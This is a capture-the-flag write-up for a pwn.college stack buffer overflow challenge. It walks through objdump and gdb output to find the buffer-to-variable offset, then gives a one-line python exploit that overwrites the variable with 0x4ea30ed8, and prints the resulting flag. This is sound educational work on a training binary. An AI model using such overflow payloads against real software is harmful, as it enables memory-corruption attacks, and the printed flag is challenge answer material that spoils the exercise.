In this challenge we have to set the `win` variable to a specific value

So first we have to locate where win variable is then overflow the buffer so that our input reaches the win variable then append the value which we want to set to the variable

From `objdump`  

    220a:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
    220e:	8b 00                	mov    eax,DWORD PTR [rax]
    2210:	3d d8 0e a3 4e       	cmp    eax,0x4ea30ed8
    2215:	75 0a                	jne    2221 <challenge+0x10c>
    2217:	b8 00 00 00 00       	mov    eax,0x0
    221c:	e8 ed fd ff ff       	call   200e <win>

we have to change win variable to `0x4ea30ed8`

Now we can use gdb to find the offset of win variable from the input buffer

    (gdb) print $rbp
    $1 = (void *) 0x7fffdc87beb0


    (gdb) x /32z $rsp
    0x7fffdc87be40:	0x6bfc26a0	0x00007edb	0xdc87cff8	0x00007fff
    0x7fffdc87be50:	0xdc87cfe8	0x00007fff	0x00000000	0x00000001
    0x7fffdc87be60:	0x00000000	0x0000000f	0x0000007c	0x00000000
    0x7fffdc87be70:	0xdc87be80	0x00007fff	0xdc87bea4	0x00007fff
    0x7fffdc87be80:	0x41414141	0x41414141	0x41414141	0x000a4141
    0x7fffdc87be90:	0x00000000	0x00000000	0x00000000	0x00000000
    0x7fffdc87bea0:	0x00000000	0x00000000	0x1c722100	0xf8d1dfe6
    0x7fffdc87beb0:	0xdc87cef0	0x00007fff	0x6653731d	0x00005ba1

The input buffer is at `0x7fffdc87be80`

Through hit and trial we can find out the offset of win variable from input buffer

    Send your payload (up to 500 bytes)!
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
    
    Breakpoint 2, 0x0000637f51c49210 in challenge ()
    (gdb) x /wx $rax
    0xa:	Cannot access memory at address 0xa

The win variable is 36 bytes after input buffer

The exploit

    python -c 'import time, sys; sys.stdout.buffer.write(b"124"); time.sleep(2); sys.stdout.buffer.write(b"A"*37 + b"\xd8\x0e\xa3\x4e")' | ./program

I used 37 bytes here because for some reason hit was skipping the first letter. I think it has something to do with pipping.

The flag

    pwn.college{AwzFjerYgb0MWb6SgB4DAbJMFG0.dhTNzMDL5kzM1czW}

